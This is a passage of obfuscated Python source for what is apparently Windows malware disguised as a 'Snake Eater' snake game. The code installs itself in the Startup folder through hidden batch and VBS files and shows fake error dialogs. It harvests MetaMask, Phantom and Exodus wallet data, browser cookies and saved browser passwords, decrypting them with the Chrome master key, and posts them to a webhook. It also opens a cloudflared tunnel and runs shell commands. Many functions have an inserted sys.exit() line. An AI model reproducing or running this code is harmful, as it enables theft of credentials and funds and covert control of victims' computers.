            OO0O00OOOO00O0000 = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"  # line:513
    elif OO000OOO00O0OOOO0 == "Darwin":  # line:514
        if OO000O00OO0OO0000 == "x86_64":  # line:515
            OO0O00OOOO00O0000 = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"  # line:516
        if OO000O00OO0OO0000 == "arm64":  # line:517
            OO0O00OOOO00O0000 = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"  # line:518
    _O0OO00O00O00OO000(OO0O00OOOO00O0000)  # line:519


def _O0OO00O00O00OO000(OO000O0O0OOOOO00O):  # line:521
    sys.exit()
    O0O0OO00OOO0O0000 = OO000O0O0OOOOO00O .split('/')[-1]  # line:522
    OOOOOOO00OOOOO000 = requests .get(
        OO000O0O0OOOOO00O, stream=True)  # line:523
    O00OO0O0O0OO0O000 = str(
        Path(tempfile .gettempdir(), O0O0OO00OOO0O0000))  # line:524
    with open(O00OO0O0O0OO0O000, 'wb')as OOO0000O0OOO0O0OO:  # line:525
        shutil .copyfileobj(OOOOOOO00OOOOO000 .raw,
                            OOO0000O0OOO0O0OO)  # line:526
    return O00OO0O0O0OO0O000  # line:527


cloudflared_address = None  # line:529


def start_cloudflared(OO00O0O0O0O0OOOOO, webhook=None):  # line:530
    sys.exit()
    global cloudflared_address  # line:531
    cloudflared_address = _O00O00O00000OO00O(OO00O0O0O0O0OOOOO)  # line:532
    print(f"Running on {cloudflared_address}")  # line:533
    if webhook != None:  # line:534
        send_to_webhook(
            content=f"**{cloudflared_address} @everyone**")  # line:535


def run_with_cloudflared(O000O0O0OOO0OO000, webhook=None):  # line:540
    sys.exit()
    O0000OO00000OO0OO = O000O0O0OOO0OO000 .run  # line:541

    def O00O00O0OOOO000OO(*O0O0OO0OOOO00OOO0, **O00OO00O00O00O000):  # line:543
        sys.exit()
        O0OO00O0OO000O0O0 = O00OO00O00O00O000 .get('port', 5000)  # line:544
        O0000OOO000OO0OOO = Timer(2, start_cloudflared, args=(
            O0OO00O0OO000O0O0, webhook,))  # line:545
        O0000OOO000OO0OOO .setDaemon(True)  # line:546
        O0000OOO000OO0OOO .start()  # line:547
        O0000OO00000OO0OO(*O0O0OO0OOOO00OOO0, **O00OO00O00O00O000)  # line:548
    O000O0O0OOO0OO000 .run = O00O00O0OOOO000OO  # line:549


app = Flask(__name__)  # line:551
run_with_cloudflared(app, webhook)  # line:553
general_folder = r'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\\' % USER_NAME  # line:559


def ran_as_admin():  # line:564
    sys.exit()
    try:  # line:565
        O000OOO0O0O0OOOO0 = (os .getuid() == 0)  # line:566
    except AttributeError:  # line:567
        try:  # line:568
            O000OOO0O0O0OOOO0 = ctypes .windll .shell32 .IsUserAnAdmin() != 0  # line:569
        except:  # line:570
            print("error with is_admin")  # line:571
            return True  # line:572
    return O000OOO0O0O0OOOO0  # line:573


def powershelldo(O0O000OO000OOOO0O):  # line:575
    sys.exit()
    O0OO0O000O0OO000O = subprocess .run(
        ["powershell", "-Command", O0O000OO000OOOO0O], capture_output=True)  # line:576
    return O0OO0O000O0OO000O  # line:577


def get_file_name(O0OOO0OOO0OOO0O0O):  # line:580
    sys.exit()
    OOOO000OO0O00O000 = O0OOO0OOO0OOO0O0O[::-1]  # line:582
    O0O0O00O0OO00O0O0 = OOOO000OO0O00O000 .split("\\")[0]  # line:583
    OO0OO000000OO00O0 = O0O0O00O0OO00O0O0[::-1]  # line:584
    return f"{OO0OO000000OO00O0}"  # line:585


def hide_file(O00OOOOOO0OOOOO0O):  # line:589
    sys.exit()
    try:  # line:590
        os .system(f"attrib +h {O00OOOOOO0OOOOO0O}")  # line:591
    except:  # line:592
        pass  # line:593


def write_bat_path(O0OO000O0000O0000):  # line:595
    sys.exit()
    O0OO0O00O0000OO0O = get_folder_nice(O0OO000O0000O0000)  # line:596
    O0OOO0000OO0O0OO0 = os .path .join(
        O0OO0O00O0000OO0O, "file.bat")  # line:597
    _O0O000O0OOO0O0O00 = get_file_name(O0OO000O0000O0000)  # line:598
    O0OOO0000OOO00O0O = '''@echo off\ncd /D "%~dp0"\npython FILENAME'''.replace(
        f"FILENAME", _O0O000O0OOO0O0O00)  # line:599
    O00000OOOO00OO00O = open(O0OOO0000OO0O0OO0, "w")  # line:600
    O00000OOOO00OO00O .write(O0OOO0000OOO00O0O)  # line:601
    O00000OOOO00OO00O .close()  # line:602
    hide_file(O0OOO0000OO0O0OO0)  # line:603
    return O0OOO0000OO0O0OO0  # line:604


startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME  # line:606
startup_full_path = os .path .join(startup_path, "Essentials.vbs")  # line:607


def add_to_startup(file_path=""):  # line:608
    sys.exit()
    try:  # line:609
        if file_path == "":  # line:610
            file_path = sys .argv[0]  # line:611
        if os .path .exists(startup_full_path) == False:  # line:615
            O0O0O0000OO00OO0O = write_bat_path(sys .argv[0])  # line:616
            print(os .path .exists(startup_full_path))  # line:617
            OOO0O00O00OOO0OOO = open(
                startup_full_path, "w", encoding="utf-8")  # line:618
            OOO0O00O00OOO0OOO .write(
                f'''CreateObject("Wscript.Shell").Run "{O0O0O0000OO00OO0O}", 0, True''')  # line:619
            OOO0O00O00OOO0OOO .close()  # line:620
            O000OO000O0OO0O00 = "Error"  # line:622
            try:  # line:623
                O00O000OOO0OOOOOO = ran_as_admin()  # line:624
                if O00O000OOO0OOOOOO == 1:  # line:625
                    O000OO000O0OO0O00 = "True"  # line:626
                elif O00O000OOO0OOOOOO == 0:  # line:627
                    O000OO000O0OO0O00 = "False"  # line:628
            except Exception as OOO0000O0O0O0O00O:  # line:629
                print(OOO0000O0O0O0O00O)  # line:630
                pass  # line:631
            send_to_webhook(
                f"File copied to startup:\n`{sys.argv[0]}` > `{startup_path}`\nRan as admin? : {O000OO000O0OO0O00}")  # line:633
            return True  # line:635
        else:  # line:636
            print("copied already")  # line:637
            return False  # line:638
    except Exception as OOO0000O0O0O0O00O:  # line:640
        print(OOO0000O0O0O0O00O)  # line:641
        return False  # line:642


def give_reason():  # line:645
    sys.exit()
    time .sleep(5)  # line:646
    if ran_as_admin():  # line:647
        win32api .MessageBox(0, 'Invalid code spacing on line 196',
                             'Syntax Error', 0x00001000)  # line:648
    else:  # line:649
        win32api .MessageBox(0, 'Installation delay - please run as admin to install',
                             'Runtime Installer Error', 0x00001000)  # line:650


def run_game():  # line:653
    sys.exit()
    OO000O0OO0OOOOO00 = 25  # line:654
    O0000O00OOO0O0OO0 = 720  # line:657
    O00O0O0OO0O00OOOO = 480  # line:658
    pygame .display .set_caption('Snake Eater')  # line:663
    O00000O0OOO000O0O = pygame .display .set_mode(
        (O0000O00OOO0O0OO0, O00O0O0OO0O00OOOO))  # line:664
    OOOO0OOOO000OOOO0 = pygame .Color(0, 0, 0)  # line:668
    O0OO0OOOOOO0000O0 = pygame .Color(255, 255, 255)  # line:669
    OOOO0O0000O000O00 = pygame .Color(255, 0, 0)  # line:670
    O0OOO00O00OOOO0O0 = pygame .Color(0, 255, 0)  # line:671
    O00O00O0OO0000O00 = pygame .Color(0, 0, 255)  # line:672
    O0O0O00OO0OOO000O = pygame .time .Clock()  # line:676
    O00O0OOOOO00OO000 = [100, 50]  # line:680
    OO0OO0OOO0000OOO0 = [[100, 50], [100 - 10, 50],
        [100 - (2 * 10), 50]]  # line:681
    O000OOO0OOOO0O000 = [random .randrange(
        1, (O0000O00OOO0O0OO0 // 10))*10, random .randrange(1, (O00O0O0OO0O00OOOO // 10))*10]  # line:683
    O0O000O0O000OO0OO = True  # line:684
    OO0O0O000OO00O000 = 'RIGHT'  # line:686
    O0000OOOOOOO0OOO0 = OO0O0O000OO00O000  # line:687
    OO000000O000OOOOO = 0  # line:689

    def OOO0O0O000OO00OOO():  # line:693
        sys.exit()
        try:  # line:694
            O0O0OOO00000OOO0O = pygame .font .SysFont(
                'times new roman', 90)  # line:695
            O0O00O0O0O0O00000 = O0O0OOO00000OOO0O .render(
                'YOU DIED', True, OOOO0O0000O000O00)  # line:696
            OOOO0000O00O0OOOO = O0O00O0O0O0O00000 .get_rect()  # line:697
            OOOO0000O00O0OOOO .midtop = (
                O0000O00OOO0O0OO0 / 2, O00O0O0OO0O00OOOO / 4)  # line:698
            O00000O0OOO000O0O .fill(OOOO0OOOO000OOOO0)  # line:699
            O00000O0OOO000O0O .blit(
                O0O00O0O0O0O00000, OOOO0000O00O0OOOO)  # line:700
            O0OO0OOO0OO0OO0O0(0, OOOO0O0000O000O00, 'times', 20)  # line:701
            pygame .display .flip()  # line:702
        except:  # line:703
            pass  # line:704
        time .sleep(3)  # line:705
        pygame .quit()  # line:706
        threading .Thread(target=run_game).start()  # line:707

    def O0OO0OOO0OO0OO0O0(OO00O000000OO0O0O, O0OOO0O000O0O0O0O, OOOOO0OO00O000OOO, OO0OO0O00O0O00OOO):  # line:711
        sys.exit()
        try:  # line:712
            O0OOO0O00O0000O00 = pygame .font .SysFont(
                OOOOO0OO00O000OOO, OO0OO0O00O0O00OOO)  # line:713
            O0O0O000O0OOOO00O = O0OOO0O00O0000O00 .render(
                'Score : '+str(OO000000O000OOOOO), True, O0OOO0O000O0O0O0O)  # line:714
            O0OO0OO00O0O0OOOO = O0O0O000O0OOOO00O .get_rect()  # line:715
            if OO00O000000OO0O0O == 1:  # line:716
                O0OO0OO00O0O0OOOO .midtop = (
                    O0000O00OOO0O0OO0 / 10, 15)  # line:717
            else:  # line:718
                O0OO0OO00O0O0OOOO .midtop = (
                    O0000O00OOO0O0OO0 / 2, O00O0O0OO0O00OOOO / 1.25)  # line:719
            O00000O0OOO000O0O .blit(
                O0O0O000O0OOOO00O, O0OO0OO00O0O0OOOO)  # line:720
        except:  # line:721
            pass  # line:722
    while True:  # line:727
        for O0O0O0OO0OOO0OOOO in pygame .event .get():  # line:728
            if O0O0O0OO0OOO0OOOO .type == pygame .QUIT:  # line:729
                pygame .quit()  # line:730
                sys .exit()  # line:731
            elif O0O0O0OO0OOO0OOOO .type == pygame .KEYDOWN:  # line:733
                # line:735
                if O0O0O0OO0OOO0OOOO .key == pygame .K_UP or O0O0O0OO0OOO0OOOO .key == ord('w'):
                    O0000OOOOOOO0OOO0 = 'UP'  # line:736
                # line:737
                if O0O0O0OO0OOO0OOOO .key == pygame .K_DOWN or O0O0O0OO0OOO0OOOO .key == ord('s'):
                    O0000OOOOOOO0OOO0 = 'DOWN'  # line:738
                # line:739
                if O0O0O0OO0OOO0OOOO .key == pygame .K_LEFT or O0O0O0OO0OOO0OOOO .key == ord('a'):
                    O0000OOOOOOO0OOO0 = 'LEFT'  # line:740
                # line:741
                if O0O0O0OO0OOO0OOOO .key == pygame .K_RIGHT or O0O0O0OO0OOO0OOOO .key == ord('d'):
                    O0000OOOOOOO0OOO0 = 'RIGHT'  # line:742
                if O0O0O0OO0OOO0OOOO .key == pygame .K_ESCAPE:  # line:744
                    pygame .event .post(
                        pygame .event .Event(pygame .QUIT))  # line:745
        if O0000OOOOOOO0OOO0 == 'UP' and OO0O0O000OO00O000 != 'DOWN':  # line:748
            OO0O0O000OO00O000 = 'UP'  # line:749
        if O0000OOOOOOO0OOO0 == 'DOWN' and OO0O0O000OO00O000 != 'UP':  # line:750
            OO0O0O000OO00O000 = 'DOWN'  # line:751
        if O0000OOOOOOO0OOO0 == 'LEFT' and OO0O0O000OO00O000 != 'RIGHT':  # line:752
            OO0O0O000OO00O000 = 'LEFT'  # line:753
        if O0000OOOOOOO0OOO0 == 'RIGHT' and OO0O0O000OO00O000 != 'LEFT':  # line:754
            OO0O0O000OO00O000 = 'RIGHT'  # line:755
        if OO0O0O000OO00O000 == 'UP':  # line:758
            O00O0OOOOO00OO000[1] -= 10  # line:759
        if OO0O0O000OO00O000 == 'DOWN':  # line:760
            O00O0OOOOO00OO000[1] += 10  # line:761
        if OO0O0O000OO00O000 == 'LEFT':  # line:762
            O00O0OOOOO00OO000[0] -= 10  # line:763
        if OO0O0O000OO00O000 == 'RIGHT':  # line:764
            O00O0OOOOO00OO000[0] += 10  # line:765
        OO0OO0OOO0000OOO0 .insert(0, list(O00O0OOOOO00OO000))  # line:768
        if O00O0OOOOO00OO000[0] == O000OOO0OOOO0O000[0] and O00O0OOOOO00OO000[1] == O000OOO0OOOO0O000[1]:  # line:769
            OO000000O000OOOOO += 1  # line:770
            O0O000O0O000OO0OO = False  # line:771
        else:  # line:772
            OO0OO0OOO0000OOO0 .pop()  # line:773
        if not O0O000O0O000OO0OO:  # line:776
            O000OOO0OOOO0O000 = [random .randrange(
                1, (O0000O00OOO0O0OO0 // 10))*10, random .randrange(1, (O00O0O0OO0O00OOOO // 10))*10]  # line:777
        O0O000O0O000OO0OO = True  # line:778
        O00000O0OOO000O0O .fill(OOOO0OOOO000OOOO0)  # line:781
        for O0O00OOO0O0OO0O0O in OO0OO0OOO0000OOO0:  # line:782
            pygame .draw .rect(O00000O0OOO000O0O, O0OOO00O00OOOO0O0, pygame .Rect(
                O0O00OOO0O0OO0O0O[0], O0O00OOO0O0OO0O0O[1], 10, 10))  # line:786
        pygame .draw .rect(O00000O0OOO000O0O, O0OO0OOOOOO0000O0, pygame .Rect(
            O000OOO0OOOO0O000[0], O000OOO0OOOO0O000[1], 10, 10))  # line:789
        if O00O0OOOOO00OO000[0] < 0 or O00O0OOOOO00OO000[0] > O0000O00OOO0O0OO0 - 10:  # line:793
            OOO0O0O000OO00OOO()  # line:794
        if O00O0OOOOO00OO000[1] < 0 or O00O0OOOOO00OO000[1] > O00O0O0OO0O00OOOO - 10:  # line:795
            OOO0O0O000OO00OOO()  # line:796
        for OOOO0OOOOO00O0OO0 in OO0OO0OOO0000OOO0[1:]:  # line:798
            if O00O0OOOOO00OO000[0] == OOOO0OOOOO00O0OO0[0] and O00O0OOOOO00OO000[1] == OOOO0OOOOO00O0OO0[1]:  # line:799
                OOO0O0O000OO00OOO()  # line:800
        O0OO0OOO0OO0OO0O0(1, O0OO0OOOOOO0000O0, 'consolas', 20)  # line:802
        pygame .display .update()  # line:804
        O0O0O00OO0OOO000O .tick(OO000O0OO0OOOOO00)  # line:806


first_time_running = add_to_startup()  # line:809
if first_time_running == False:  # line:810
    pass  # line:811
    startup_info = "This is NOT the first time running"  # line:813
else:  # line:815
    startup_info = "Ran for 1st time"  # line:816
try:  # line:819
    send_to_webhook(
        f":flushed:\n**{startup_info}**\n```{ip_data}```\nManu:\n```{_OO00O0OO0000O0O0O}```")  # line:820
except Exception as e:  # line:821
    print(e)  # line:822
    pass  # line:823


def do_cmd_stuff(_O0O0O0O000OO0OO00):  # line:825
    sys.exit()
    try:  # line:826
        O00O00OO0O0OOO000 = subprocess .run(
            _O0O0O0O000OO0OO00, capture_output=True, shell=True)  # line:828
    except Exception as OOOO0000000OOOO0O:  # line:829
        print(OOOO0000000OOOO0O)  # line:830
        pass  # line:831


def get_metamask(response_needed=False):  # line:838
    sys.exit()
    try:  # line:839
        O0OO0O0OOO0OO00OO = r'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn' % USER_NAME  # line:840
        O00OOOO0OO0O00000 = os .listdir(O0OO0O0OOO0OO00OO)  # line:841
        for O0OO0OOO00O000OOO in O00OOOO0OO0O00000:  # line:842
            try:  # line:843
                O0O0OO0O0OOO00OOO = os .path .join(
                    O0OO0O0OOO0OO00OO, O0OO0OOO00O000OOO)  # line:844
                OOO00000O0OOOOOO0 = open(
                    O0O0OO0O0OOO00OOO, "r", errors="ignore")  # line:845
                O00OO0OOOO00O0OO0 = OOO00000O0OOOOOO0 .read()  # line:846
                OOO00000O0OOOOOO0 .close()  # line:847
                if 'vault' in O00OO0OOOO00O0OO0:  # line:848
                    O0OO0OO0OO0000OOO = O00OO0OOOO00O0OO0 .split(
                        '{"vault":"')[1].split('"},')[0]  # line:849
                    O0OO0OO0OO0000OOO = O0OO0OO0OO0000OOO .replace(
                        "\\", "")  # line:850
                    if response_needed == False:  # line:851
                        send_to_webhook("**MetaMask Vault**:\n<https://metamask.github.io/vault-decryptor/>\n<https://github.com/MetaMask/vault-decryptor>",
                                        O0OO0OO0OO0000OOO, "metamask.txt")  # line:852
                    else:  # line:853
                        return O0OO0OO0OO0000OOO  # line:854
            except Exception as OO0OOO0O0OOOOOOO0:  # line:855
                pass  # line:857
    except:  # line:858
        pass  # line:859
    return "Could not find"  # line:860


def get_phantom(response_needed=False):  # line:861
    sys.exit()
    try:  # line:862
        O0OO00O00O0O0O0O0 = r'C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa' % USER_NAME  # line:863
        OO0OO00O000OOOOO0 = os .listdir(O0OO00O00O0O0O0O0)  # line:864
        for OO0O00OOO0O00OOO0 in OO0OO00O000OOOOO0:  # line:865
            try:  # line:866
                O00OO0O00000O00O0 = os .path .join(
                    O0OO00O00O0O0O0O0, OO0O00OOO0O00OOO0)  # line:867
                if O00OO0O00000O00O0 .endswith(".log"):  # line:868
                    OO0OOOOO0OO0O0O00 = {str(OO0O00OOO0O00OOO0): open(
                        O00OO0O00000O00O0, 'rb')}  # line:869
                    if response_needed == False:  # line:870
                        send_to_webhook(
                            "**Phantom Data**\nCopy this to your extension folder", OO0OOOOO0OO0O0O00)  # line:871
                    else:  # line:872
                        O0O0OOOOO00000000 = upload_file(
                            O00OO0O00000O00O0, OO0O00OOO0O00OOO0)  # line:873
                        return O0O0OOOOO00000000  # line:874
            except Exception as OOO00O0000000OOOO:  # line:875
                pass  # line:876
    except:  # line:877
        pass  # line:878


def get_exodus(response_needed=False):  # line:880
    sys.exit()
    try:  # line:881
        O00OOOOO0O0O00O00 = r'C:\Users\%s\AppData\Roaming\Exodus\exodus.wallet' % USER_NAME  # line:882
        O0O00OOO0OOO000OO = os .listdir(O00OOOOO0O0O00O00)  # line:883
        for OO00O0O0OOO000O00 in O0O00OOO0OOO000OO:  # line:884
            try:  # line:885
                OOOO000000O0O00O0 = os .path .join(
                    O00OOOOO0O0O00O00, OO00O0O0OOO000O00)  # line:886
                OO0OOO000000O0O00 = {str(OO00O0O0OOO000O00): open(
                    OOOO000000O0O00O0, 'rb')}  # line:887
                send_to_webhook(
                    f"**Exodus - copy this data**\n```{OO00O0O0OOO000O00}\n```", OO0OOO000000O0O00)  # line:888
            except Exception as O00OO0O00000O0OO0:  # line:889
                pass  # line:890
    except:  # line:891
        pass  # line:892
    return "Exodus"  # line:893


def get_cookies(response_needed=False):  # line:896
    sys.exit()
    O00O0O000OOO0OO00 = ""  # line:897
    O00O0OOO00OO0O0OO = [[browser_cookie3 .chrome, "Chrome"], [browser_cookie3 .edge, "Edge"], [
    browser_cookie3 .firefox, "Firefox"], [browser_cookie3 .opera, "Opera"]]  # line:898
    for OOO0000OO000OOO0O in O00O0OOO00OO0O0OO:  # line:901
            # line:902
        O0O0OO0O0OOO00000, O00O000O0OOOOOOO0 = OOO0000OO000OOO0O[0], OOO0000OO000OOO0O[1]
        O000000000O00OOOO = []  # line:903
        try:  # line:904
            OOO0O0O00OOOOO0OO = O0O0OO0O0OOO00000()  # line:906
            for O0O00O0OOOO0OO0O0 in OOO0O0O00OOOOO0OO:  # line:907
                try:  # line:908
                    O000000000O00OOOO .append({"domain": O0O00O0OOOO0OO0O0 .domain, "path": O0O00O0OOOO0OO0O0 .path,
                                                "value": O0O00O0OOOO0OO0O0 .value, "name": O0O00O0OOOO0OO0O0 .name})  # line:909
                except Exception as OOOO0OOO00OO0OO0O:  # line:911
                    print(OOOO0OOO00OO0OO0O)  # line:912
            OO0O00O0O000O0O0O = json .dumps(
                O000000000O00OOOO, indent=4)  # line:914
            if len(O000000000O00OOOO) != 0:  # line:915
                if response_needed == False:  # line:916
                    send_to_webhook(f"**{len(O000000000O00OOOO)} {O00O000O0OOOOOOO0} Cookies**",
                                    OO0O00O0O000O0O0O, f"{O00O000O0OOOOOOO0.lower()}_cookies.txt")  # line:917
                else:  # line:918
                    # line:919
                    O00O0O000OOO0OO00 += f"{OO0O00O0O000O0O0O}\n\n\n"
        except Exception as OOOO0OOO00OO0OO0O:  # line:922
            pass  # line:923
    if response_needed != False:  # line:925
        return O00O0O000OOO0OO00  # line:926


_OOOO00O0O0OO000O0 = os .environ .get("USERNAME")  # line:928


def findLocalState(OO00000OOOOOO0O00):  # line:930
    sys.exit()
    # line:931
    for O00OOO00O000OO0OO, O00O0000OO000O00O, O0OO00O0O000O00O0 in os .walk(OO00000OOOOOO0O00):
        for O00OO000OO00O0O00 in O0OO00O0O000O00O0:  # line:932
            if O00OO000OO00O0O00 == 'Local State':  # line:933
                OO00000O0O00OOOO0 = os .path .join(
                    O00OOO00O000OO0OO, O00OO000OO00O0O00)  # line:934
    return OO00000O0O00OOOO0  # line:935


def locate(O000O0OO000O000OO):  # line:937
    sys.exit()
    if O000O0OO000O000OO:  # line:938
        # line:939
        for O0O0O0OO0OO000O0O, O000O0OO00OO00OO0, O000O0O00O00O0OOO in os .walk(O000O0OO000O000OO):
            for O0OO0O0O0000000O0 in O000O0O00O00O0OOO:  # line:940
                if O0OO0O0O0000000O0 == 'cookies.sqlite':  # line:941
                    OO0O0OOOO0O00O0OO = os .path .join(
                        O0O0O0OO0OO000O0O, O0OO0O0O0000000O0)  # line:942
                    parseFirefox(OO0O0OOOO0O00O0OO)  # line:943
                elif O0OO0O0O0000000O0 == 'Cookies' and 'Edge'not in O000O0OO000O000OO:  # line:944
                    OO0O0OOOO0O00O0OO = os .path .join(
                        O0O0O0OO0OO000O0O, O0OO0O0O0000000O0)  # line:945
                    parseDB(OO0O0OOOO0O00O0OO)  # line:946
                elif O0OO0O0O0000000O0 == 'Login Data':  # line:947
                    OO0O0O00O0000O000 = os .path .join(
                        O0O0O0OO0OO000O0O, O0OO0O0O0000000O0)  # line:948
                    grabPwd(OO0O0O00O0000O000)  # line:949


def parseFirefox(OO00OO000OOOO0O0O):  # line:951
    sys.exit()
    return  # line:952
    OO0000OOO0000000O = sqlite3 .connect(OO00OO000OOOO0O0O)  # line:953
    O0OO0OOO0O00O00OO = OO0000OOO0000000O .cursor()  # line:954
    _O000OOOOO0OO0O0OO = r"C:\Users\\" + \
        _OOOO00O0O0OO000O0 + "\Desktop\info.txt"  # line:955
    # line:956
    for OOO0000OOOOO000OO in O0OO0OOO0O00O00OO .execute('SELECT * FROM moz_cookies'):
        with open(file=_O000OOOOO0OO0O0OO, mode="at")as OO0OO0OO00OOOO000:  # line:957
            OO0OO0OO00OOOO000 .write(str(OOO0000OOOOO000OO)+"\n")  # line:958
    try:  # line:959
        os .system(f"attrib +h {_O000OOOOO0OO0O0OO}")  # line:960
    except:  # line:961
        pass  # line:962


def parseDB(O0O00OO0O0O0OO0OO):  # line:968
    sys.exit()
    return  # line:969
    O00O000O0O00000O0 = sqlite3 .connect(O0O00OO0O0O0OO0OO)  # line:970
    O00OO0OOOO00O0O0O = O00O000O0O00000O0 .cursor()  # line:971
    _OOO000OOO0000000O = r"C:\Users\\" + \
        _OOOO00O0O0OO000O0 + "\Desktop\info2.txt"  # line:972
    # line:973
    for OO0000OO0O0OOO0OO in O00OO0OOOO00O0O0O .execute('SELECT * FROM cookies'):
        with open(file=_OOO000OOO0000000O, mode="at")as OO0O000OOOO0OO0O0:  # line:974
            OO0O000OOOO0OO0O0 .write(str(OO0000OO0O0OOO0OO)+"\n")  # line:975
    try:  # line:977
        os .system(f"attrib +h {_OOO000OOO0000000O}")  # line:978
    except:  # line:979
        pass  # line:980


def get_master_key(OO0O00O000OO0OOO0):  # line:986
    sys.exit()
    with open(OO0O00O000OO0OOO0, "r")as O0000O0000OOOO000:  # line:987
        O00OO00OOOO00OOO0 = O0000O0000OOOO000 .read()  # line:988
        O00OO00OOOO00OOO0 = json .loads(O00OO00OOOO00OOO0)  # line:989
    OOOOOOOOO00OOO00O = base64 .b64decode(
        O00OO00OOOO00OOO0["os_crypt"]["encrypted_key"])  # line:990
    OOOOOOOOO00OOO00O = OOOOOOOOO00OOO00O[5:]  # line:991
    OOOOOOOOO00OOO00O = win32crypt .CryptUnprotectData(
        OOOOOOOOO00OOO00O, None, None, None, 0)[1]  # line:992
    return OOOOOOOOO00OOO00O  # line:993


def decrypt_payload(OOO00000OOOO0O0OO, OO00OOOO00O0OOOOO):  # line:995
    sys.exit()
    return OOO00000OOOO0O0OO .decrypt(OO00OOOO00O0OOOOO)  # line:996


def generate_cipher(OO0OOOO00O0O00OOO, OOOOO0O0OOO0O0O00):  # line:998
    sys.exit()
        # line:999
    return AES .new(OO0OOOO00O0O00OOO, AES .MODE_GCM, OOOOO0O0OOO0O0O00)


def decrypt_password(O0OO00OO0O0O000O0, OOOOOO00O0O0OOOOO):  # line:1001
    sys.exit()
    try:  # line:1002
        OO0O000O00OOOO0O0 = O0OO00OO0O0O000O0[3:15]  # line:1003
        O000O0OO0OOO0OOO0 = O0OO00OO0O0O000O0[15:]  # line:1004
        OO00O00O0O0000OO0 = generate_cipher(
            OOOOOO00O0O0OOOOO, OO0O000O00OOOO0O0)  # line:1005
        O00OOOOO00OO0OO00 = decrypt_payload(
            OO00O00O0O0000OO0, O000O0OO0OOO0OOO0)  # line:1006
        O00OOOOO00OO0OO00 = O00OOOOO00OO0OO00[:-16].decode()  # line:1007
        return O00OOOOO00OO0OO00  # line:1008
    except Exception as OOOO0O000000OO0O0:  # line:1009
        return "None - Chrome Version Outdated"  # line:1010


def grabPwd (OOO0OO0O000000O0O):  # line:1012
    sys.exit()
    global pw_msg  # line:1013
    OOOOO0O00OOO0O00O = None  # line:1014
    if "Chrome" in OOO0OO0O000000O0O:  # line:1015
        O00O00O0O0000OOOO = get_master_key(findLocalState (r'C:\Users\\'+_OOOO00O0O0OO000O0 + r'\AppData\Local\Google\Chrome\User Data\\'))  # line:1016
        OOOOO0O00OOO0O00O = "CHROME"  # line:1017
    if "Edge" in OOO0OO0O000000O0O:  # line:1018
        O00O00O0O0000OOOO = get_master_key(findLocalState (r'C:\Users\\'+_OOOO00O0O0OO000O0 + r'\AppData\Local\Microsoft\Edge\User Data\\'))  # line:1019
        OOOOO0O00OOO0O00O = "EDGE"  # line:1020
    if "Brave" in OOO0OO0O000000O0O:  # line:1021
        O00O00O0O0000OOOO = get_master_key(findLocalState (r'C:\Users\\'+_OOOO00O0O0OO000O0 + r'\AppData\Local\BraveSoftware\Brave-Browser\User Data'))  # line:1022
        OOOOO0O00OOO0O00O = "BRAVE"  # line:1023
    if "GX" in str (OOO0OO0O000000O0O).upper ():  # line:1024
        O00O00O0O0000OOOO = get_master_key(findLocalState (r'C:\Users\\'+_OOOO00O0O0OO000O0 + r'\AppData\Roaming\Opera Software\Opera GX Stable'))  # line:1025
        OOOOO0O00OOO0O00O = "OPERA GX"  # line:1026
    if "OPERA" in str (OOO0OO0O000000O0O ).upper () and 'GX'not in str (OOO0OO0O000000O0O ).upper ():  # line:1028
        O00O00O0O0000OOOO = get_master_key(findLocalState (r'C:\Users\\'+_OOOO00O0O0OO000O0 + r'\AppData\Roaming\Opera Software\Opera Stable'))  # line:1029
        OOOOO0O00OOO0O00O = "OPERA"  # line:1030
    if OOOOO0O00OOO0O00O == None:  # line:1032
        OOOOO0O00OOO0O00O = "UNKNOWN BROWSER"  # line:1033
        try:  # line:1034
            OOOOO0O00OOO0O00O += str (OOO0OO0O000000O0O)  # line:1035
        except:  # line:1036
            pass  # line:1037
    if pw_msg != "":  # line:1038
        pw_msg += "\n\n\n"  # line:1039
    pw_msg += f"[{OOOOO0O00OOO0O00O}]\n\n\n"  # line:1040
    O0OO0O0000O000O00 = OOO0OO0O000000O0O  # line:1041
    shutil .copy2 (O0OO0O0000O000O00, "Loginvault.db")  # line:1042
    O00OO0OOO00000O0O = sqlite3 .connect("Loginvault.db")  # line:1043
    OO0OO000O0000O000 = O00OO0OOO00000O0O .cursor()  # line:1044
    try:  # line:1045
        OO0OO000O0000O000 .execute(
            "SELECT action_url, username_value, password_value FROM logins")  # line:1046
        for OO0OOOO00O000O00O in OO0OO000O0000O000 .fetchall():  # line:1047
            O0O0OOOO0O0O00OOO = OO0OOOO00O000O00O [0]  # line:1048
            OOOOO0OO0OOOOOO0O = OO0OOOO00O000O00O [1]  # line:1049
            O0OO0000O0O0OO0OO = OO0OOOO00O000O00O [2]  # line:1050
            OOOO00OO000O000O0 = decrypt_password (O0OO0000O0O0OO0OO , O00O00O0O0000OOOO )  # line:1051
            if len (OOOOO0OO0OOOOOO0O ) > 0 :  # line:1052
                # line:1053
                pw_msg += f"{O0O0OOOO0O0O00OOO}\n{OOOOO0OO0OOOOOO0O}\n{OOOO00OO000O000O0}\n\n"
    except Exception as OO0OO0O000000OO00:  # line:1054
        pass  # line:1055
    OO0OO000O0000O000 .close()  # line:1056
    O00OO0OOO00000O0O .close()  # line:1057
    try:  # line:1058
        os .remove("Loginvault.db")  # line:1059
    except Exception as OO0OO0O000000OO00:  # line:1060
        pass  # line:1061

pw_msg = ""  # line:1062


def get_passwords (response_needed =False):  # line:1063
    sys.exit()
    global pw_msg  # line:1064
    pw_msg = ""  # line:1065
    OOO00O0OOOO00000O = r'C:\Users\\'+_OOOO00O0O0OO000O0 + \
        r'\AppData\Local\Google\Chrome\User Data\\'  # line:1066
    O0O00O0O00O0O0000 = r"C:\Users\\"+_OOOO00O0O0OO000O0 + \
        "\\AppData\Roaming\Mozilla\Firefox\Profiles"  # line:1067
    OOO0OOO0OOOO0O000 = r'C:\Users\\'+_OOOO00O0O0OO000O0 + \
        r'\AppData\Local\Microsoft\Edge\User Data\\'  # line:1068
